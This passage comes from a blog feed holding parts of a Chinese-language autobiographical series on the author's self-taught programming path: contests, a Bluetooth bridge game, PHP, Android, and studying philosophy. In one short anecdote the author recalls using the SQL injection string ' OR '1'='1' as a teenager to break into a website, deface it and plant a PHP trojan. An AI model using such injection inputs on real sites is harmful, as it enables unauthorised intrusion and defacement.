的課程，只要有興趣的人都可以來上課，總共是十堂，每堂應該是一個小時左右。在上課的過程中，我發現許多人其實缺少計算機概論的基礎，導致他們對於一些概念理解困難，我就想說，是不是有機會能夠提供簡單版的計算機概論課程，讓他們能夠更好的理解。</p><p>所以在這門課結束後，我就自己開了<a href="http://slides.com/aszx87410/cs-lesson1#/">生活中的 Computer Science</a>系列課程，希望能用簡單易懂的例子把計算機概論講得更生活化一點。</p><p>而這堂課其實就是我之後在 Hahow 上面開設的：<a href="https://hahow.in/cr/cs-the-easy-way">初心者的計概與 coding 火球術</a>的前身。</p><p>其實會一腳踏入教學的世界，除了 Hahow 這門課程以外，還有另外兩個因素。</p><p>第一個是我之前寫的：<a href="http://huli.logdown.com/posts/703835">十年程式自學之路</a>，這篇文章獲得知名度之後就有一些人來找我合作，大多都是去講自學程式的心得以及給自學者一些建議等等。</p><p>第二個是我在 ptt 受到其他人影響而發起的<a href="https://github.com/aszx87410/programming-tutorial-review">免費程式教學</a>。</p><p>這兩件事情再加上 Hahow 的課，開啟了我的教學之路。從一直在部落格上面問問題到自己開設線上課程，再到實體一對一講解程式概念，不知不覺就變成一個一直在分享的人了。</p><p>但其實你看我前面舉那麼多例子你就知道，我原本就是一個很愛分享的人，看我部落格這麼多文章就知道了。我一再強調我分享的理由是因為我這一路走來，真的受過的幫助太多太多了。要不是有網路上熱心前輩們的分享，我也走不到現在的位置。</p><p>另一方面，分享其實也是在「幫助以前的自己」，我希望不要有人跟我犯一樣的錯，我希望跟以前的我有一樣疑慮的人，都能夠找到解答。因此在我自己找到解答之後，才會分享出去，希望能幫助到「跟以前的我一樣的人」。想知道更多教學理念的話，可以參考：<a href="http://huli.logdown.com/posts/1971256-lidemy-online-programming-course-platform-for-the-beginner">Lidemy 鋰學院：為初學者而生的線上程式課程平台</a>。</p><p>講到這邊，其實我的程式生涯就差不多了，現在的工作這一段因為待的時間較短所以先忽略掉，講到這就行了。這系列文章到目前已經涵蓋了從國小一直到出社會，將近十幾年的時光了。</p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>自己整理完這一段十年的程式之路以後，依舊覺得自己的背景真的很特別，而能在小六的時候就找到一生的志向也是無比幸運的一件事。我以自己這樣特別的背景自豪，這樣到處沾一點的背景，擴展了知識的廣度，也讓我可以從更多的切入點去解決問題。</p><p>而這樣自學程式、人文相關科系的背景，也讓我覺得自己更適合程式教學。因為我也是那樣走過來的，我也體驗過迴圈很難的日子，經歷過被指標搞瘋的時候。自己走過來之後，就可以用一種過來人的心態，幫助別人也一起走過來。</p><p>會寫程式的工程師有很多，但同時喜歡教學的可能只有一半，又喜歡分享的再砍半，還要能夠把概念解釋得清楚又少了一半的人。這樣一直減下來，最後的人就所剩無幾了。</p><p>幸好，我是其中的一個。</p><p>雖然文章很長，但仍然有許多段經歷沒有提到。</p><p>可是要完整提到的話還要再寫好多，我就先記在這邊吧！像是跟幾個朋友做的台北市長選舉政見 App：Brighter Future，或是讓我在上班的第一年還持續跟學校有連結，並讓我接觸到設計思考的 InfoPlat。還有不斷分享，不斷逼自己每個月一定要產出一篇文章的 Techbridge，這些經歷也都對我很有幫助。</p><p>上面每一段故事裡出現的人我都很感謝，都是幫助我成長的養份，讓我明白自己的價值在哪，讓我明白我原來還可以做得更多。</p><p>我目前最新的方向就是程式教學這一塊，是我難得很有熱情的一個領域，如果對之後教學的動向有興趣，歡迎追蹤 <a href="https://www.facebook.com/lidemytw">Lidemy 鋰學院粉絲專頁</a>。</p><p>最後，也希望正在閱讀的你可以從我的故事中得到一點收穫，只要能有一點點就好，感謝。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自學、哲學、講學：我的程式之路（中）</title>
      <link href="/2017/10/06/the-programming-journey-2-98dea8c475ae/"/>
      <url>/2017/10/06/the-programming-journey-2-98dea8c475ae/</url>
      
        <content type="html"><![CDATA[<p>此篇為系列文章第二篇，若是你錯過了第一篇誤打誤撞進來這裡，傳送門在這：</p><p><a href="/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">自學、哲學、講學：我的程式之路（上）</a></p><h3 id="眼界的開闊與自信的泉源：高中的競賽人生"><a href="#眼界的開闊與自信的泉源：高中的競賽人生" class="headerlink" title="眼界的開闊與自信的泉源：高中的競賽人生"></a>眼界的開闊與自信的泉源：高中的競賽人生</h3><p>高中的主線就只有一條，那就是程式競賽。</p><p>我先大概說明一下高中的程式競賽，或其實我之前在 ptt <a href="https://www.ptt.cc/bbs/Soft_Job/M.1451998694.A.9BA.html">其實就有講過</a>，我這邊稍微再整理一次。</p><p>高中的時候資訊競賽這一塊就有官方辦的了，比較重要的比賽是區域性的程式競賽，我的學校（師大附中）在台北市，因此叫做北市賽，全名是：台北市資訊能力競賽。每個學校能夠派出的選手名額有限，因此如果太多人，學校會先辦一個校內賽。</p><p>北市賽的獎項分成四種：一等獎 5 個、二等獎 5 個、三等獎 10 個跟入選獎，前十名（也就是一二等）可以參加全國賽。</p><p>全國賽就是各個區域賽的前十名聚集在一起比賽，獎項跟區域賽一樣，而全國賽前十名可以保送 TOI 選訓營。</p><p>TOI 就是<a href="http://toi.csie.ntnu.edu.tw/">臺灣資訊奧林匹亞研習營 Taiwan Olympiad in Informatics</a>，想進去 TOI 的話有兩種管道，第一種就是全國賽前十名，第二種是 TOI 會自己辦一個入營考，入營考的前二十名也能進去。</p><p>所以一屆 TOI 會有 30 個人，這 30 個人進去之後就叫做選訓營的第一階段，會集體住到師大去培訓兩個禮拜。在這期間都是跟學校請公假，整整兩個禮拜不用去上學。而這兩個禮拜就是政府包吃包住，在師大的學生餐廳出示證件就能夠免錢吃飯。</p><p>培訓期間白天就是找資工系的教授來上課，教一些演算法與資料結構相關的東西，但大部分時間其實都還是靠自己練習跟研究。因為全部三十個人都有共同的興趣，所以要找人討論問題也很容易。晚上就是自由活動時間了，我只有在高一的時候進去過一次選訓營，那也是我第一次玩 Dota 這個遊戲。因為我們晚上都在打 Dota。</p><p>第一階段的兩週期間內會有兩次考試，考試成績會決定你能不能進去第二階段。我在這一個階段就被刷掉了（成績好像還是最後一名），能進到第二階段的大約有 12 個人左右，一樣繼續在師大培訓兩個禮拜，一樣也會有兩次考試。第二階段的兩次考試結束之後會取出前四名，這前四名就是國手了，代表國家去參加 IOI，資訊奧林匹亞。</p><p>除此之外呢，走這條競賽路線有一個額外的好處，那就是靠著這條管道升學。基本上只要你在第二階段有前幾名，都能夠保送台大資工，別人還在準備考試的時候你就已經是大學生了。比較後面的名次好像也能夠試著申請看看清大或是交大等等的資工系。</p><p>我最認真的時候應該是高一，那時為了準備入營考、北市賽等等可以跟學校請公假來練習，但也因此缺了很多課，例如說 log 的部分我好像幾乎整章都沒有上到。但請公假的時光滿開心的，可以盡情做自己喜歡做的事。</p><p>而這種程式題目平時的練習都會透過一種自動的系統來批改，叫做 Online Judge，線上測驗系統。最有名的就是<a href="https://uva.onlinejudge.org/">UVa Online Judge</a>，那時候我們大家習慣用的是建中資訊社自己架的系統，叫做 TIOJ。</p><p>我在練程式解題的時候，就是不斷去找新的題目來練習，同時也在看一些資料結構與演算法的書籍，每解完一題還會在自己的 BBS 個版上面記錄心得：</p><p><img src="/img/the-programming-journey-2-98dea8c475ae/0__PHnbKXIagL5QU2lU.jpg"></p><p>那時幫助我最大的網站是<a href="https://web.ntnu.edu.tw/~algo/">演算法筆記</a>，可以看著上面的文章來練習，再利用解題的方式去驗證自己到底有沒有搞懂。</p><p>國中跟高中那幾年裡面，我大概學了一些基本的東西，像是：DFS, BFS, 最短路徑, 最小生成 🌲, 背包問題等等。</p><p>但其實對我來說幫助最大的不是學了哪些演算法，知道哪些資料結構，而是在解題過程中培養的能力。可以從題目快速的就猜到大概是哪一種題型，大概要怎麼解。這些思考的過程跟方法都是很重要的收穫。</p><p>除此之外，其實最大的幫助有兩個，就是我標題講到的那兩個。</p><h3 id="開闊眼界"><a href="#開闊眼界" class="headerlink" title="開闊眼界"></a>開闊眼界</h3><p>在資訊競賽中認識的朋友們都是一時之選，是全台灣資訊競賽最厲害的一群人。我認識的大部分的人後來都跑去唸台清交的資工系了，都往本科系這條路上繼續走，到大學都一直有繼續比程式競賽。也有滿多的人都跑去 Google 實習什麼的。</p><p>會說開闊眼界，是因為這些人其實就是全台灣資訊能力最頂尖的一群人（其中的一群人啦，我相信還有更多不是走這一塊但資訊能力一樣超強的人），認識到這些人會讓我知道前段的人的能力到哪裡，都過著什麼樣的生活。</p><p>知道人外有人天外有天也是一件很重要的事，會讓你知道自己有多渺小。認識了這麼多強者，就會覺得自己連邊都沾不上。</p><h3 id="自信的泉源"><a href="#自信的泉源" class="headerlink" title="自信的泉源"></a>自信的泉源</h3><p>怎麼維持自信的平衡是一件很重要的事，前面才講說覺得自己很渺小，怎麼現在又說程式競賽反而是我自信的來源？這個平衡是指說知道比你優秀的人在哪裡，同時也知道自己在哪個位置。雖然跟他們比起來很渺小，但其實跟同年齡的其他人來說，我的資訊能力已經是很不錯的了。</p><p>之所以程式競賽這一段經歷會成為我自信的其中一部分，是因為演算法與資料結構這些其實是大學資工系會修到的課（但課程難度比高中學的那些還要難上好幾倍）。在這之前，其實我的程式都是自己學的，無論是一開始的 VB 或是之後拿來程式解題的 C&#x2F;C++，都是自己練習而成。儘管之後有老師帶，但也只是給一些方向給資源，其實大部份時間還是靠自己。</p><p>因此，演算法與資料結構這一塊就變成我跟資工系的連結之一，儘管我從來都沒有唸過資工系，但至少我知道他們會學些什麼，而且我也確實學過其中一部分的東西。這讓我覺得我好像也不是那麼非本科系，至少我可能有半隻腳是在資工系裡面的(?)。</p><p>而且比起其他同樣是自學的人，他們可能會先學寫網頁，像大部份的程式補習班都是直接教你那些工作以後會用到的技能，而不是著重在這些資訊工程本科系的基礎（演算法與資料結構、作業系統、網路概論、計算機組織等等），跟他們相比，我就多了演算法與資料結構這一塊的基礎，這通常是半路轉職出家的工程師最缺乏的一塊。</p><p>而我很幸運地，在高中就把這一塊補齊了。（但我其實只會很基本的，而且一段時間沒練習就會忘光）</p><p>上面這一段競賽經歷是我資訊生涯中很重要的一塊，給了我十足的自信心，覺得自己不會比本科系的人還要差。除此之外，高中也是我遠離 VB，開始學習其他程式語言的時候。</p><h3 id="山不轉路轉"><a href="#山不轉路轉" class="headerlink" title="山不轉路轉"></a>山不轉路轉</h3><p>高二的時候我們班上很喜歡打橋牌，每一節下課都在打，全盛時期可以開到四桌，同時有 16 個人在玩牌。但因為要面臨大考，班導覺得打橋牌會影響到其他人（因為我們打牌真的滿吵的），所以禁止帶橋牌到班上，全部撲克牌都沒收。</p><p>那時大約是 2011 年，智慧型手機還沒興起，大家用的都是現在俗稱的「智障型手機」，最受歡迎的牌子是 Sony Ericsson。那時候手機裡面也有遊戲，大家喜歡玩的是小朋友下樓梯、Doodle jump 跟 Lumines，都是單機遊戲。一直到之後有小精靈或是三國殺大家才會用藍芽連線。那時候的手機可以上網，但是是用 GPRS 或是 2G，要瀏覽什麼網頁都很慢。</p><p>既然班導下令不能帶橋牌，那有沒有可能我自己寫一個在手機上跑的橋牌連線程式呢？這樣大家就可以用手機打橋牌了！</p><p>就因為這個突然其來的 idea，我開始研究 J2ME。在這之前，我完全沒寫過 Java。</p><p>那時候的我似乎對程式已經滿有 Sense 的了，知道要完成橋牌連線程式最重要的一部分就是藍芽連線，只要可以搞定這一塊，其他的其實都不是什麼問題，於是我就上網找相關的資源來看。</p><p>我印象最深刻的是中文資源極少，幾乎沒什麼文章是在講 J2ME 的藍芽連線，我只好到後來找到一些國外的文章或甚至是 PDF 電子書裡面的其中一個章節，才總算搞懂要怎麼在 Java 裡面呼叫藍芽的各種功能，像是搜尋跟連線。還記得我國一時寫的那個五子棋連線程式嗎？因為那時候已經有相關經驗，所以這一次寫起來其實沒什麼困難。其實就只要把藍芽的部分搞定，剩下就差不多了。</p><p>大概兩個禮拜的時間，我就完成了我第一個手機應用程式：多人藍芽連線橋牌遊戲。</p><p><img src="/img/the-programming-journey-2-98dea8c475ae/0__2TBoJzaUAcvPzw0c.jpg"></p><p>這是遊戲畫面，還有主畫面跟邀請對戰的畫面，流程就是其中一個人當 Server，另外三個人用藍芽連線到他的手機，所有資料都是透過這台手機再轉傳給其他人。</p><p>完成這個遊戲的時候很有成就感，因為我找了好多資料去研究藍芽怎麼連線，而且這是我第一個手機應用程式，可以隨時拿給別人看說：這我寫的。</p><p>但這遊戲在我們班上的存活時間大約是五天，五天過後就被小精靈給取代了，就再也沒有人用手機玩橋牌了。</p><h3 id="不像補習班的補習班"><a href="#不像補習班的補習班" class="headerlink" title="不像補習班的補習班"></a>不像補習班的補習班</h3><p>高中的最後一條支線是我那時候的補習班：得勝者文教。</p><p>我是個不愛補習的人。</p><p>但每次總是會被補習班的招生人員吸引，覺得應該去補習班拼拼看，我要考台大！我要考榜首！何況這間補習班跟其他的不一樣，當初負責招生的老師跟我聊的不是學校成績，而是魔獸信長該怎麼出裝比較好，聊說打信長打了多久、最愛用哪一個角色。就是因為這樣，我選擇加入這個補習班，因為我覺得他特別。</p><p>以後見之明來看，我選對地方了。</p><p>我是個不愛補習的人。這我前面講過一次了，為什麼要再講一次呢？代表我真的很不愛補習。</p><p>我那時候是從高一開始補吧，一直補到高二學測結束為止，可是我補了三個月還是半年我就不想補了，我實在是懶得去補習班，要被關在同一個地方實在是太難受了，我想要自由，想要百分百的自由。於是我就跟我媽說我不想補了，後來就到補習班去辦退費。</p><p>在退費的時候有跟補習班主任聊了一下，他有問我說我為什麼不想補之類的，我就說因為我覺得靠自己念也可以，再加上我有「其他的升學管道」。沒錯，我指的就是上面說的資訊競賽，曾經我是想要靠著這條路升學的，但身為一個只會空想而不會付諸實際努力的人，最後也僅能是空想。</p><p>而主任聽到這個之後很感興趣，我就跟他多說了一點，跟他說什麼是程式解題，什麼是資訊奧林匹亞，要怎樣才能保送台大資工，才能出國比賽。他看起來滿感興趣的，我那時候就覺得，這個人不一樣。</p><p>儘管如此，我還是離開補習班了。因為我就是不喜歡那個地方。</p><p>一直到學測失利之後我發現：「不行，快要指考了，不真正拼一次不行了」，才又重回補習班去乖乖待著，很努力地唸了一百天左右的書。但那時我看上的是補習班的環境，一個你可以整天待在那邊寫考卷，看參考書的環境。這點是其他地方都沒辦法給我的，我是一個在家裡就絕對、絕對念不下書的人。</p><p>高三學測結束的時候，主任問我有沒有認識會寫網頁的人，他想來做個學測落點分析之類的網頁，我那時候介紹他我一個大安高工的朋友，我知道他會寫 PHP。後來我那朋友跟我說：「PHP 很簡單啦，你一定學一下就會」，我就跑去看了一下 PHP 的教學，看一看發現：「哇，真的好簡單！」</p><p>從那時候開始，我就習得了網頁後端這個技能。</p><p>話說我其實在高中的時候就想學 Ruby on Rails，那時候是 Rails 最潮的一段時間，那時候的我完全沒有任何後端基礎，衝著 Rails 說它可以快速開發這點就去找一些資源學了一下。碰了一點之後發現：好難，真的好難。我明明就有程式基礎，為什麼會這麼難？</p><p>從那時候開始，我就認為 Rails 不適合初學者，因為它簡化太多東西了，我不知道為什麼這邊只要設定一個東西，另外一邊的程式就能夠接收到。我不知道我要改的時候要改哪邊，它全部都幫我設定好了。這大概就像是直接叫一個新手去學 React 一樣，你可以教他，他一樣會寫，但是他不知道為什麼要這樣用，他不知道原來在 React 之前我們還有 vanilla js，還有 jQuery。</p><p>但總之呢，我很慶幸接觸了 PHP，它打開了我網頁設計的這一條路。</p><p>而剛剛提到的補習班主任跟我那個朋友，在我高三的時候共同打造出網頁版的學測落點分析系統，那時候好像算是個創舉，因為很少人這樣做，都只是提供實體的落點分析服務（這段其實我不太確定，也有可能網頁版落點分析已經有很久了）。但至少，我們幫助補習班多了一個新產品。</p><h3 id="Android-的興起"><a href="#Android-的興起" class="headerlink" title="Android 的興起"></a>Android 的興起</h3><p>高中生涯結束於跟社團的朋友們一起去南部玩，那時候大家都差不多換成智慧型手機了，而我靈機一動，想說順便來練功試試看寫一個 Android App 好了，最後寫出了一個超級陽春的行事曆 App，說穿了其實就只是一個 ListView 而已。</p><p><img src="/img/the-programming-journey-2-98dea8c475ae/0__aOsy__8wN9mJMoURt.jpg"></p><p>但寫出這個的時候我也證明了一件事：對那時的我來說，學一項新的東西已經沒什麼困難的了（這邊專指寫應用程式）。寫網頁、寫 App 對我來說都差不多，只是程式語言換了一個而已，背後的原理都是一樣的。</p><p>而會寫 Android App 這個技能，也在日後起了作用。</p><h3 id="邁向下一個階段"><a href="#邁向下一個階段" class="headerlink" title="邁向下一個階段"></a>邁向下一個階段</h3><p>國中是累積程式實力，不斷藉由解決自己的問題打造出各式各樣的小程式。高中是沈浸於程式解題，打下演算法與資料結構以及解題的基礎，也是與資工本科系的連結之一，除此之外也認識到資訊能力頂尖的一群朋友。同時也培養了自己寫應用程式的能力，會寫網頁又會寫 App。</p><p>那大學呢？大學就是真正走向戰場，驗證自己在市場上的價值的時刻。</p><p>在把時間軸推進到大學之前，其實還有一個重要的問題必須回答：「為什麼我是念哲學系？」（如果你現在才知道我念哲學系，沒關係，畢竟前面這些文章看一看，你也絕對不會想到我是念哲學系）</p><p>其實我在高二以前，都還是把資工系定為我的第一志願的。那之後是什麼讓我轉變了呢？第一點是因為我開始發現自己其實滿討厭物理跟化學，對這些東西都提不起什麼興趣，尤其是化學，我最不喜歡的就是化學。</p><p>再來是因為我程式一路走來都自學，我那時候就想說：就算大學不念資工系，也還是可繼續自己自學程式啊，念不念資工系跟要不要寫程式是沒有衝突的兩件事情。就算不念資工也可以繼續精進程式。</p><p>學測我考了 60 級分，班排倒數第二，校排大概是最後 5 %，但我還是申請了幾所學校的資訊相關科系，像是北教大、國北教、中山、中央等等，這幾間都是我覺得這個級分可能有機會進去的科系。結果呢？結果放榜那天收到這封簡訊：</p><p><img src="/img/the-programming-journey-2-98dea8c475ae/0__7XoDOgxCid9yOqnb.jpg"></p><p>我那時已經決定，如果學測考不上，指考就要改考一類組了。比起物理化學，我更喜歡歷史跟公民（不喜歡地理），考一類組的分數一定會比考二類組高很多很多，而且念自己喜歡的科目也比較能夠念得下去。因此，就做了考一類組這個決定。</p><p>分數出來以後發現自己大概能上台大最後面幾個系跟政大的非商科，原本想念政大廣告，覺得廣告系聽起來很有趣，不然的話去念個語言相關的也可以，至少能學會一種新的語言。但後來跟補習班主任以及家人討論過後，發現文組的任何一個科系我好像都不排斥，但也沒有到很喜歡，那不如就選校吧，去台大看看台大長什麼樣子。</p><p>我仔細想一想也合理，這輩子還沒進過台大，現在不進，以後也不會進了，那不如就去台大看看吧！於是我按照分數填了志願，最後上就上了台大哲學系。這就是我之所以為什麼不念資工系而是念哲學系的故事。</p><p>但我對哲學當然也不排斥，甚至在看了<a href="http://www.books.com.tw/products/0010522244">史上最強哲學入門</a>之後對哲學產生了興趣，覺得哲學其實也沒有這麼艱澀難懂。</p><p>進了哲學系之後，開啟了我人生中一個新的篇章。</p><p>續集傳送門：</p><p><a href="/2017/10/05/the-programming-journey-3-ebd9e995a4eb/">自學、哲學、講學：我的程式之路（下）</a></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自學、哲學、講學：我的程式之路（上）</title>
      <link href="/2017/10/06/the-programming-journey-1-b9b19c0ef05b/"/>
      <url>/2017/10/06/the-programming-journey-1-b9b19c0ef05b/</url>
      
        <content type="html"><![CDATA[<p>無意間看到一篇<a href="https://blog.alphacamp.co/2016/06/03/my-path-to-web-development/">文章</a>在分享自己學網頁的歷程與心得，而這類型的文章其實我也曾經想要寫過。</p><p>在我寫<a href="http://huli.logdown.com/posts/703835">十年程式自學之路</a>的時候，其實我原本想寫的是像剛才提到的那樣，有許多篇幅在講述自己學程式的經歷以及做過的事。可是我寫一寫發現那時候徵文的主題其實是自學的一些心得，所以才改成後來大家看到的那樣，著重在十年裡面學習到的經驗。</p><p>這一篇其實算是個人傳記，在動筆之前想到了以前看過的經典文章：<a href="http://blog.vgod.tw/category/divine-code/">追求神乎其技的程式設計之道</a>，風格大概會比較像那樣吧！就是詳細地紀錄了自己一路上究竟學了些什麼，是怎麼走過來的。</p><p>這篇最難的部分大概就是標題了，原本想取叫：「十年程式之路」，發現跟上一篇太過於類似，可能會有人以為是同一篇。幸好靈機一動想出來現在的這個標題，但其實「講學」這個詞用得有點過了，在這邊先跟大家說聲抱歉。講學純粹是為了跟前面兩個「學」相互呼應，我不認為我有到講學的程度，頂多就是分享一些經驗跟教學而已。</p><p>好了，前言差不多就到這邊。因為這系列會很長，所以拆成上中下三篇來寫。</p><h3 id="接觸電腦的開端"><a href="#接觸電腦的開端" class="headerlink" title="接觸電腦的開端"></a>接觸電腦的開端</h3><p>要接觸到程式，必定要先接觸電腦。我第一次接觸到電腦應該是我小二的時候，那時候大概是 2002 年（如果我沒算錯的話），平時也沒做什麼，應該就是玩玩遊戲或者是用 Yahoo 即時通跟其他同學聊天。</p><p>因為電腦接觸的早，再加上用電腦的時間又多，自然就會接觸到很多不一樣的東西。例如說論壇，我小學四年級的時候就在巴哈姆特哈拉區裡面打滾了，甚至還做過超級短暫的楓之谷版副版主以及瘋狂阿給版版主，現在想起來覺得很荒謬，怎麼會讓一個小學生來管版。但也因為接觸的早，讓我不像其他同齡小孩一樣會打注音文或是火星文（我可是很遵守版規的）。</p><p>不過那段不是重點，那比較適合寫成「我的網路史」之類的系列文。</p><p>總之呢，因為接觸電腦接觸的很早，所以總會在網路世界上面看到各式各樣的文章，以及五花八門的資源。</p><p>而我接觸程式的契機，也跟許多人一樣，是遊戲。</p><h3 id="與程式的第一次接觸"><a href="#與程式的第一次接觸" class="headerlink" title="與程式的第一次接觸"></a>與程式的第一次接觸</h3><p>老實說，其實我忘記是遊戲還是駭客引起我對程式的興趣，畢竟都這麼久以前的事情了。最有可能的情況應該是覺得遊戲外掛很帥很猛，就去查資料查到駭客這個詞，再去找一些駭客相關的文章，都提到說：駭客一定要會寫程式。就因為這句話，決定開始自學程式。</p><p>我記得很清楚，我第一次接觸程式是我小六的時候，那是 2006 年的事情。不過，儘管小二到小六的這四年都與程式沒什麼關係，但對我來說也很重要。那幾年都在網路上面的社群打滾（巴哈姆特、XBOX 論壇），以及與朋友用 Yahoo 即時通聊天訓練打字速度。這兩個對我的影響至今仍然存在，尤其是後者，不斷訓練打字速度的結果就是我的中打速度滿快的，現在大約一分鐘 150~180 個字（新注音），視狀況好壞跟要打的文章內容而定。</p><p>決定接觸程式以後，第一件事情就是先上網搜尋要學什麼程式語言。沒錯，我也當過懵懂的初學者，我也做過幾乎全天下想學程式的人都會做的事情。</p><p>搜尋到一些網路資源之後，發現有人推薦 Visual Basic，因為比較容易學習，也有人推薦 C，說是學程式一定要從這個開始才能打好基礎。我最後選了 VB。原因很簡單，因為 C 的程式碼我完全看不懂在幹嘛，我討厭那些惹人厭的分號跟大括號，讓程式碼看起來像天書一樣。而 VB 相對之下就和善許多。</p><p>找到學習目標之後，一樣先用關鍵字去搜尋大家推薦的書籍（沒錯，就跟所有初學者都會做的事情一樣），最後得到了一些清單，再去書店裡面找實體書來翻翻看，看一下前幾章的內容自己是否能夠理解。</p><p>確認自己能夠理解之後，就買下了我人生中的第一本程式設計書籍：<a href="http://www.books.com.tw/products/0010328166?loc=M_001_025">Visual Basic 2005 完美的演繹</a>。</p><p>那時候我就知道，我選 VB 真的是選對程式語言了。為什麼？因為在眾多程式語言之中，VB 是最簡單開發 GUI 程式的一個。你只要在畫面左方選擇你要的控制項並且丟到右邊去，你的介面就這樣做完了。整個流程根本超級簡單，馬上就可以做出一個看得到的程式。</p><p><img src="/img/the-programming-journey-1-b9b19c0ef05b/0__68vS0Vj8foAdagtV.jpg"></p><p>（圖片來源：<a href="http://darkranger.no-ip.org/archives/v5/files/project/club-web/vb6/ide.htm">http://darkranger.no-ip.org/archives/v5/files/project/club-web/vb6/ide.htm</a>）</p><p>我人生中的第一個程式是畫面上有一些按鈕，按了按鈕之後有一個文字會改變。就是這麼簡單的一個小程式，但卻讓那時候的我感動不已：「原來操控電腦是這種感覺！原來寫程式是這種感覺」，看到自己寫出來的程式能動並且活生生地展現在你面前，是一件非常有成就感的事情。</p><p>現在我之所以會<a href="http://huli.logdown.com/posts/772671-why-you-should-start-from-scratch-to-learning-program">極力推薦</a> Scratch 作為新手入門的第一個程式語言，其中一個原因就是因為 Scratch 能夠很輕易地做出互動式的介面，會讓你剛開始學程式時的成就感更大，也能夠馬上看到回饋。比起 C 入門萬年不變的黑底白字 Terminal 畫面，我相信 Scratch 或是 VB 寫出來的程式會讓你覺得更有趣一點。</p><p>學 VB 還有一個重點，那就是當時的電腦內建都可以跑 VB6，只要丟一個 exe 檔給你的朋友，他們就能夠執行。原本我學的是 VB2005，後來跑去寫 VB6，因為 VB2005 寫出來的程式需要安裝  .NET framework，那時候 XP 還沒有內建這個東西，所以要安裝很麻煩，但 VB6 寫出來的程式，什麼都不用裝就可以執行了。</p><p>而那時候我也跟所有剛入門程式的人一樣，會問一些「程式設計師之後會沒落或興起嗎？」之類的問題，現在看起來有點好笑，但那是我國一時候問的問題，應該還算是合情合理吧，畢竟才國一嘛！問題連結：<a href="http://www.programmer-club.com.tw/ShowSameTitleN/newuser/4737.html">只學 VB 的話,可以走上程式設計師這條路嘛？</a></p><p>我學程式的時候是小六升國一的暑假，利用暑假的時間把那本書的前半段都看過了，後半段什麼 DAO 跟資料庫的因為太懶惰就直接忽略不看。我印象最深刻的一件事情是迴圈，我怎麼看都看不懂迴圈到底在做什麼。但過了一兩個禮拜之後，不知道為什麼我就突然看懂了。這讓我學習到一件事，時間是最好的武器，有些解不開的問題時間一久，就不知道為什麼自動解開了。</p><p>國中階段是我的程式萌芽期，現在回想起來應該也是我最認真的一段期間，也是最主動的一段。我把它分為三個不同的支線來講：</p><ol><li>幹壞事是進步最大的原動力</li><li>利用程式解決自己的問題</li><li>科展與程式競賽</li></ol><h3 id="幹壞事是進步最大的原動力"><a href="#幹壞事是進步最大的原動力" class="headerlink" title="幹壞事是進步最大的原動力"></a>幹壞事是進步最大的原動力</h3><p>（標題來自：<a href="https://blog.gslin.org/">Gea-Suan Lin’s BLOG</a>）</p><p>這一條支線來自於國中階段無意間發現有一個網站叫做恰吉網（現在去搜尋，只能搜到這篇新聞：<a href="http://www.appledaily.com.tw/appledaily/article/headline/20101030/32924455/">架「恰吉網」炫耀 大學駭客攻擊網站 po 教學</a>），裡面有一些影片教學，全部都是在講駭客有關的東西。</p><p>駭客對一個國中生來講絕對是很有趣的東西。為什麼？因為很帥、很酷，可以入侵網站耶！超酷的吧！</p><p>而就是在這個階段，我開始有了資訊安全的概念，我知道什麼是木馬，什麼是肉雞，知道加殼、脫殼，也知道 SQL Injection 與 XSS，還實際用過<code>&#39; OR &#39;1&#39;=&#39;1&#39;</code>入侵過網站，偷偷改了首頁跟放了 PHP 木馬。也知道 WPE Pro 可以抓封包並且更改、重新發送，發現某個線上遊戲可以利用這樣來改變角色的位子什麼的。</p><p>但其實上面這些東西我都沒有深入研究，我的理解僅止於：「知道這個東西大概是什麼」而已，所以我不會手工脫殼也不會加殼，要叫我用 IDA Pro 去反組譯一個程式並且追蹤我也做不到。SQL Injection 我也不會自己打，我甚至看不懂 SQL 那一堆有的沒有的指令，我只會用<code>&#39; OR &#39;1&#39;=&#39;1&#39;</code>而已。因此那時候的我應該算是個腳本小子吧，只會撿現成的工具來用。</p><p>總之在這一條支線裡面，讓我瞭解到許多資訊安全的基本概念，儘管很多東西沒有真的實作過，但至少我知道名詞也大概知道原理。而根據往後的經驗，在國中就能有這樣的資訊安全基礎，對以後的程式生涯非常、非常有幫助。</p><h3 id="利用程式解決自己的問題"><a href="#利用程式解決自己的問題" class="headerlink" title="利用程式解決自己的問題"></a>利用程式解決自己的問題</h3><p>許多人在程式自學的路上常會碰到一個問題，那就是基礎都學完之後，不知道該怎麼繼續精進，這時候我就會推薦他們寫一些小作品。有些人會回我說：可是我不知道要寫什麼啊！我就會跟他們說從模仿開始，留言板啦，部落格啦，都是很好的模仿。或是我認為每個人的生活周遭一定都有一些小問題，這時候就可以嘗試自己用程式來解決。</p><p>而那時候的我就是這樣，喜歡自己寫程式來解決自己的問題。</p><p>例如說我碰到的一個問題就是我要貼文章到 PTT 上面的時候，因為網址太長所以要用 Tinyurl 去縮網址，可是如果我有十個網址，我就要複製貼上並且產生短網址十次。那時候我就想說，有沒有辦法能夠優化呢？</p><p>因此我寫了一個小程式可以偵測剪貼簿裡面的內容，當偵測到剪貼簿裡面有網址時，就用 API 去呼叫 Tinyurl 縮網址，並且把回傳的結果取代回剪貼簿。意思就是說你今天複製某個網址，等個兩三秒再貼上，長網址就變成短網址了。</p><p>還有一個有趣的小程式是在聊天的時候，偶爾會不小心忘記切換中英文，打出 uv;4g45k4u;4 這種東西，我就寫了一個小程式能夠複製剛剛那段文字，並且幫你轉換成中文。而原理就是先幫你把輸入法切換成中文，再呼叫鍵盤的 API 直接用程式幫你把上面的字再打一次。</p><p>或是那時候我有一台電腦好像哪邊壞掉或是沒電，每次重開機時間都會還原成出廠時間，都要手動自己再調整很不方便。我就乾脆寫了一個開機自動執行的小程式，連上網路抓取最新的時間並且自動設置。有了這個程式之後替我省了很多麻煩，從那時候我就體驗到自動化的好處。</p><p>所以囉，我才說生活中一定有一些你常碰到的問題，這時候就可以自己寫程式去解決它。如果不會寫怎麼辦？就查啊！例如說我上面那些我原本也不會寫，都是去查怎麼用之後才學會的，例如說：<code>vb 開機 執行</code>、<code>vb 模擬 